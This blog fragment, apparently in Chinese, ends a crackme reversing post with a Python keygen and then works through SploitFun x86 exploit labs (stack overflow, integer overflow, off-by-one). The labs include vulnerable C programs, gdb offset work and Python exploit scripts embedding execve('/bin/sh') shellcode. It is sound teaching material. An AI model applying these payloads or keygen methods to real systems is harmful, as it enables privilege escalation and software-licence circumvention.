<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image028.jpg" alt="img" style="zoom:80%;">
<p>比较函数过后会来到这个地方，test eax，eax，表示eax为1时跳转，这里我们的eax是0，尝试修改为jne</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image030.jpg" alt="img" style="zoom:80%;">
<p>之后可以看到是成功的，说明这个就是关键跳</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image032.jpg" alt="img" style="zoom:80%;">
<p>我们要写一个注册机程序那就得先逆向他的加密代码，根据我们判断以下的逻辑</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image033.jpg" alt="img" style="zoom:80%;">
<p>写出python脚本代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>a=<span class="hljs-built_in">str</span>(raw_input(<span class="hljs-string">&quot;请输入用户名：&quot;</span>)) <br>yanzhen=[<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x13</span> ,<span class="hljs-number">0x09</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x0B</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x08</span>]<br>edi=<span class="hljs-built_in">len</span>(a)<br><span class="hljs-comment">#print len(a)</span><br>ecx=<span class="hljs-number">3</span><br>esi=<span class="hljs-number">0</span><br>eax=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> ecx&lt;edi:<br>  <span class="hljs-keyword">if</span> eax&gt;<span class="hljs-number">7</span>:<br>    eax=<span class="hljs-number">0</span><br>  ebx=<span class="hljs-number">0</span><br>  edx=<span class="hljs-number">0</span><br>  edx=<span class="hljs-built_in">ord</span>(a[ecx])<br>  ebx=yanzhen[eax]<br>  <span class="hljs-comment">#print &quot;ebx=&quot; + str(ebx)</span><br>  <span class="hljs-comment">#print &quot;edx=&quot; + str(edx)</span><br>  ebx=edx*ebx<br>  esi=ebx+esi<br>  ecx+=<span class="hljs-number">1</span><br>  eax+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;序列号为：&quot;</span>+ <span class="hljs-built_in">str</span>(esi)<br></code></pre></td></tr></table></figure>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image035.gif" alt="img" style="zoom:80%;">
<p>验证</p>
<p><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image037.gif" alt="img" style="zoom:80%;"><img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image039.gif" alt="img" style="zoom:80%;"></p>
]]></content>
      <categories>
        <category>逆向学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>逆向学习</tag>
      </tags>
  </entry>
  <entry>
    <title>《SploitFun Linux x86 Exploit 开发系列教程》学习</title>
    <url>/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><strong>0x00：</strong></p>
<p>其实这篇博客是后来上传的了，这居然是我们的网络攻防实验课的作业，当时我选的方向是二进制，《SploitFun Linux x86 Exploit 开发系列教程》这书确实不错，很多基本的二进制漏洞都有了，吐槽下：<strong>就是书里面很多二进制漏洞都是用的内存中的绝对地址，这意味着你要自己调试知道地址是多少</strong>，还有坑就是如果在你的环境下调试出来的地址<strong>带有/x00之类的截断字符</strong>，就有可能被截断，然后实验不成功。这里只有前7个实验，实验8未成功，以及之后堆的实验都是<strong>需要一定的环境才能复现，有些漏洞现在早已不能使用</strong>，建议直接使用ctf题目学习。</p>
<h1 id="实验一典型的基于堆栈的缓冲区溢出"><a class="markdownIt-Anchor" href="#实验一典型的基于堆栈的缓冲区溢出"></a> 实验一：典型的基于堆栈的缓冲区溢出</h1>
<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
<p>什么是缓冲区溢出？ 将源缓冲区复制到目标缓冲区可能导致溢出</p>
<p>1、源字符串长度大于目标字符串长度。</p>
<p>2、不进行大小检查。</p>
<p>缓冲区溢出有两种类型：</p>
<p>1、基于堆栈的缓冲区溢出 - 这里的目标缓冲区位于堆栈中</p>
<p>2、基于堆的缓冲区溢出 - 这里的目标缓冲区位于堆中</p>
<p>漏洞代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-comment">/* [1] */</span> <span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-comment">/* [2] */</span> <span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">/* [3] */</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input:%s\n&quot;</span>,buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="1使用ubuntu1204x86版本进行编译"><a class="markdownIt-Anchor" href="#1使用ubuntu1204x86版本进行编译"></a> 1.使用Ubuntu12.04（x86）版本进行编译</h2>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730165935638.png" alt="image-20210730165935638" style="zoom:80%;">
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170014233.png" alt="image-20210730170014233" style="zoom:80%;">
<h2 id="2查看程序里的堆栈布局"><a class="markdownIt-Anchor" href="#2查看程序里的堆栈布局"></a> 2.查看程序里的堆栈布局</h2>
<p>gdb调试输入disassemble main</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170048792.png" alt="image-20210730170048792" style="zoom:80%;">
<h2 id="3测试是否能覆盖返回地址"><a class="markdownIt-Anchor" href="#3测试是否能覆盖返回地址"></a> 3.测试是否能覆盖返回地址</h2>
<p>先通过python输入大量的A</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170137935.png" alt="image-20210730170137935" style="zoom:80%;">
<p>然后通过gdb查看此时eip的地址</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170157849.png" alt="image-20210730170157849" style="zoom:80%;">
<p>可以看到此时eip的地址为0x41414141，41为A在内存里的值，所以eip的地址被输入的A覆盖了。</p>
<h2 id="4准确覆盖返回地址测试"><a class="markdownIt-Anchor" href="#4准确覆盖返回地址测试"></a> 4.准确覆盖返回地址测试</h2>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170220140.png" alt="image-20210730170220140" style="zoom:80%;">
<p>我们可以知道返回地址的位置是0x100+0x8+0x4=0x10c</p>
<p>其中</p>
<p>0x100 是 ‘buf’ 的大小 0x8 是 对齐空间 0x4 是调用者的ebp</p>
<p>这时候我们可以测试输入268<em>A和4</em>B，我们就可以吧返回地址覆盖成0x42424242</p>
<p>Gdb调试测试如下：</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170248840.png" alt="image-20210730170248840" style="zoom:80%;">
<p>可以看到重新调试之后，eip的地址覆盖成了0x42424242</p>
<h2 id="5构建exp攻击"><a class="markdownIt-Anchor" href="#5构建exp攻击"></a> 5.构建exp攻击</h2>
<p>首先我们得知道buf的地址，我们先把攻击的的脚本用来输入，再使用gdb调试看返回地址的位置</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170515205.png" alt="image-20210730170515205" style="zoom:80%;">
<p>然后查看栈中shellcode的返回的位置</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170531756.png" alt="image-20210730170531756" style="zoom:80%;">
<p>*ret_addr可以为&quot;\x90&quot;中任意一个地址，&quot;\x90&quot;在shellcode为nop空操作</p>
<p>找到shellcode的位置是0xbffff224，然后将攻击脚本中ret_addr改为0xbffff220</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170611805.png" alt="image-20210730170611805" style="zoom:80%;">
<p>运行即可成功拿到root shell</p>
<h1 id="实验二整数溢出"><a class="markdownIt-Anchor" href="#实验二整数溢出"></a> 实验二：整数溢出</h1>
<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
<h2 id="1-原理"><a class="markdownIt-Anchor" href="#1-原理"></a> 1. 原理</h2>
<p>什么是整数溢出？</p>
<p>存储大于最大支持值的值称为整数溢出。整数溢出本身不会导致任意代码执行，但整数溢出可能会导致堆栈溢出或堆溢出，这可能导致任意代码执行。</p>
<p>数据类型大小及范围：</p>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170757200.png" alt="image-20210730170757200" style="zoom:80%;">                               
<p>当我们试图存储一个大于最大支持值的值时，我们的值会被包装 。例如，当我们尝 试将 2147483648 存储到带符号的 int 数据类型时，它将被包装并存储 为 -21471483648 。这被称为整数溢出，这种溢出可能导致任意代码执行 整数下溢 类似地，存储小于最小支持值的值称为整数下溢。例如，当我们尝试 将 -2147483649 存储到带符号的int数据类型时，它将被包装并存储 为 21471483647 .这称为整数下溢。在这里我只会谈论整数溢出，但是这个过程对 于下溢也是一样的！</p>
<p>漏洞代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">store_passwd_indb</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* passwd)</span> </span>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">validate_uname</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* uname)</span> </span>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">validate_passwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* passwd)</span> </span>&#123;<br><span class="hljs-keyword">char</span> passwd_buf[<span class="hljs-number">11</span>];<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> passwd_len = <span class="hljs-built_in">strlen</span>(passwd); <span class="hljs-comment">/* [1] */</span><br><span class="hljs-keyword">if</span>(passwd_len &gt;= <span class="hljs-number">4</span> &amp;&amp; passwd_len &lt;= <span class="hljs-number">8</span>) &#123; <span class="hljs-comment">/* [2] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Valid Password\n&quot;</span>); <span class="hljs-comment">/* [3] */</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-built_in">strcpy</span>(passwd_buf,passwd); <span class="hljs-comment">/* [4] */</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid Password\n&quot;</span>); <span class="hljs-comment">/* [5] */</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br>&#125;<br>store_passwd_indb(passwd_buf); <span class="hljs-comment">/* [6] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">if</span>(argc!=<span class="hljs-number">3</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage Error: \n&quot;</span>);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>validate_uname(argv[<span class="hljs-number">1</span>]);<br>validate_passwd(argv[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="2-编译以及溢出点"><a class="markdownIt-Anchor" href="#2-编译以及溢出点"></a> 2. 编译以及溢出点</h2>
<p>编译指令</p>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170859269.png" alt="image-20210730170859269" style="zoom:80%;">
<p>漏洞代码中上述漏洞代码的 [1] 行显示了一个整数溢出错误。 strlen 的返回类型</p>
<p>是 size_t （ unsigned int ），它存储在 unsigned char 数据类型中。因</p>
<p>此，任何大于 unsigned char 的最大支持值的值都会导致整数溢出。因此当密码</p>
<p>整数溢出长度为261时，261将被包裹并存储为 passwd_len 变量中的5！由于这个整数溢出，可以绕过行 [2] 执行的边界检查，从而导致基于堆栈的缓冲区溢出！</p>
<h2 id="3-堆栈和溢出测试"><a class="markdownIt-Anchor" href="#3-堆栈和溢出测试"></a> 3. 堆栈和溢出测试</h2>
<p>用gdb查看堆栈</p>
<pre><code>                                                      &lt;img src=&quot;image-20210730170924024.png&quot; alt=&quot;image-20210730170924024&quot; style=&quot;zoom:80%;&quot; /&gt;
</code></pre>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170955621.png" alt="image-20210730170955621" style="zoom:80%;">
<p>此时堆栈结构为</p>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171019424.png" alt="image-20210730171019424" style="zoom:80%;">
<p>测试1：是否可以覆盖返回地址？</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171129071.png" alt="image-20210730171129071" style="zoom:80%;">
<p>输入261个A后可以看到返回地址确实成了0x41414141</p>
<p>测试2：目的缓冲区的偏移量是多少？</p>
<p>这里让我们从缓冲区 passwd_buf 中找出什么偏移返回地址。反汇编并绘制了 validate_passwd 的堆栈布局，现在可以尝试找到偏移位置信息！堆栈布局显 示返回地址位于缓冲区 passwd_buf 的偏移（ 0x18 ）处。 0x18 计算如下：</p>
<p>0xb ：passwd_buf 的大小</p>
<p>0x1： passwd_len 的大小</p>
<p>0x4：对齐空间</p>
<p>0x4：edi</p>
<p>0x4：调用者的ebp</p>
<p>测试输入&quot;A&quot; * 24 + “B” * 4 + “C” * 233，用B覆盖返回地址</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171149653.png" alt="image-20210730171149653" style="zoom:80%;">
<p>测试返回地址被覆盖成了0x42424242，说明判断是对的</p>
<h2 id="4构建exp攻击"><a class="markdownIt-Anchor" href="#4构建exp攻击"></a> 4.构建exp攻击</h2>
<p>通过查看内存可以找到</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171203079.png" alt="image-20210730171203079" style="zoom:80%;">
<p>返回地址的位置在0xbffff20c开始处</p>
<p>我们的攻击脚本中返回地址的选取是在这个返回地址后的100个“\x90”中</p>
<p>我们随机选取一个地址0xbffff240攻击脚本改为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>arg1 = <span class="hljs-string">&quot;sploitfun&quot;</span><br><span class="hljs-comment">#Stack address where shellcode is copied.</span><br>ret_addr = <span class="hljs-number">0xbffff240</span><br><span class="hljs-comment">#Spawn a shell</span><br><span class="hljs-comment">#execve(/bin/sh)</span><br>scode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="hljs-comment">#endianess convertion</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#nk + RA + NOP&#x27;s + Shellcode</span><br>arg2 = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">24</span><br>arg2 += conv(ret_addr);<br>arg2 += <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">100</span><br>arg2 += scode<br>arg2 += <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">108</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, arg1, arg2])<br><span class="hljs-built_in">print</span> arg2<br> <br></code></pre></td></tr></table></figure>
<p>运行测试可以得到rootshell</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171301037.png" alt="image-20210730171301037" style="zoom:80%;">
<h1 id="实验三off-by-one-漏洞基于栈"><a class="markdownIt-Anchor" href="#实验三off-by-one-漏洞基于栈"></a> 实验三：Off-By-One 漏洞（基于栈）</h1>
<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
<h2 id="1-原理-2"><a class="markdownIt-Anchor" href="#1-原理-2"></a> 1. 原理</h2>
<p><strong>什么是off by one？</strong></p>
<p>将源字符串复制到目标缓冲区可能会导致off by one 1、源字符串长度等于目标缓冲区长度。 当源字符串长度等于目标缓冲区长度时，单个 NULL 字节将被复制到目标缓冲区上 方。这里由于目标缓冲区位于堆栈中，所以单个 NULL 字节可以覆盖存储在堆栈中 的调用者的EBP的最低有效位（LSB），这可能导致任意的代码执行。<br>
漏洞代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bar</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span> </span>&#123;<br>bar(arg); <span class="hljs-comment">/* [1] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bar</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf, arg); <span class="hljs-comment">/* [2] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>])&gt;<span class="hljs-number">256</span>) &#123; <span class="hljs-comment">/* [3] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Attempted Buffer Overflow\n&quot;</span>);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>foo(argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">/* [4] */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure>
<h2 id="2-编译以及溢出点-2"><a class="markdownIt-Anchor" href="#2-编译以及溢出点-2"></a> 2. 编译以及溢出点</h2>
<p><strong>编译指令：</strong></p>
   <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171628517.png" alt="image-20210730171628517" style="zoom:80%;">                       
<p>上述漏洞代码的第 [2] 行是可能发生off by one溢出的地方。目标缓冲区长度为 256，因此长度为256字节的源字符串可能导致任意代码执行。 如何执行任意代码执行？ 使用称为“EBP覆盖”的技术实现任意代码执行。如果调用者的EBP位于目标缓冲区 之上，则在 strcpy 之后，单个 NULL 字节将覆盖调用者EBP的LSB。</p>
<p>用gdb查看堆栈布局</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171655079.png" alt="image-20210730171655079" style="zoom:80%;">
<p>通过这样我们得到的堆栈布局是</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171725012.png" alt="image-20210730171725012" style="zoom:80%;">
<p>这样的</p>
<p>当我们已经知道256字节的用户输入，用空字节可以覆盖 foo 的EBP的LSB。所以 当 foo 的存储在目标缓冲区 buf 之上的EBP被一个 NULL（“\x00”） 字节所覆盖时，ebp 从 0xbffff2d8 变为 0xbffff200 。从堆栈布局我们可以看到堆栈位 置 0xbffff200 是目标缓冲区 buf 的一部分，由于用户输入被复制到该目标缓冲 区，攻击者可以控制这个堆栈位置（ 0xbffff200 ），因此他控制指令指针（eip ）使用他可以实现任意代码执行。</p>
<h2 id="3溢出测试"><a class="markdownIt-Anchor" href="#3溢出测试"></a> 3．溢出测试</h2>
<p>测试步骤1：EBP是否覆盖，从而可能覆盖返回地址</p>
<p>测试输入256个“A”</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171746339.png" alt="image-20210730171746339" style="zoom:80%;">
<p>可以看到eip被覆盖成了0x41414141</p>
<p>测试步骤2：距离目标缓冲区的偏移是多少？</p>
<p>现在，我们可以从目标缓冲区 buf 的起始位置开始找到偏移量，我们需要替换我们的返回地址。记住在off by one 漏洞中，我们不会覆盖堆栈中存储的实际返回地址（像我们在基于堆栈的缓冲区溢出中），而是攻击者控制的目标缓冲区 buf 内的4字节内存区域将被视为返回地址位置（在off by one溢出之后）。因此，我们需要找到这个返回地址位置偏移量（从 buf ），它是目标缓冲区 buf 本身的一部分</p>
<p>通过调试，输入256个a，gdb查看内存发现在0xbffff218位置的ebp的值被覆盖成了0xbffff200</p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/Users\17473\Desktop\博客\SploitFun Linux x86 Exploit 开发系列教程\image-20210730171807528.png" alt="image-20210730171807528" style="zoom:80%;">
<p>如果ebp的地址为0xbffff200，那我们就知道eip的位置应该为0xbffff204</p>
<p>这个位置距离buf起始位置是0x204-0x118=236，所以我们输入的236个A后面的数就可以覆盖到eip指针</p>
<p>尝试输入</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span> `python -c &#x27;print <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">236</span>+<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">16</span>&#x27;`<br></code></pre></td></tr></table></figure>
<p>此时的内存空间如下</p>
<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171936781.png" alt="image-20210730171936781" style="zoom:80%;">
<p>这个时候0xbffff204的位置刚好被覆盖成了0x42424242，继续运行程序发现eip指针变成了0x42424242</p>
<h2 id="4构建exp"><a class="markdownIt-Anchor" href="#4构建exp"></a> 4.构建exp</h2>
<p>根据上面测试的内容，我们可以构建这样的exp：</p>
<p>返回地址设定为0xbffff180，buf里的内容先是输入100个A（这时buf应该在0xbffff170左右）然后再接上30个nop指令和shellcode，构建如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br><span class="hljs-comment">#Spawn a shell.</span><br><span class="hljs-comment">#execve(/bin/sh) Size- 28 bytes.</span><br>scode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90&quot;</span><br>ret_addr = <span class="hljs-number">0xbffff180</span><br><span class="hljs-comment">#endianess conversion</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#nk + RA + NOP&#x27;s + Shellcode+junk</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">100</span><br>buf += <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">30</span><br>buf += scode<br>buf += <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">78</span><br>buf += conv(ret_addr)<br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">16</span><br><span class="hljs-comment">#print &quot;Calling vulnerable program&quot;</span><br><span class="hljs-built_in">print</span> buf<br><span class="hljs-comment">#call([&quot;./vuln&quot;, buf])</span><br><br></code></pre></td></tr></table></figure>
<p>使用gdb调试，然后输入此exp可以拿到rootshell</p>
<p>*<strong>理论是正确的，直接运行我就拿不到，不知道为什么</strong></p>
 <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730172617549.png" alt="image-20210730172617549" style="zoom:80%;">
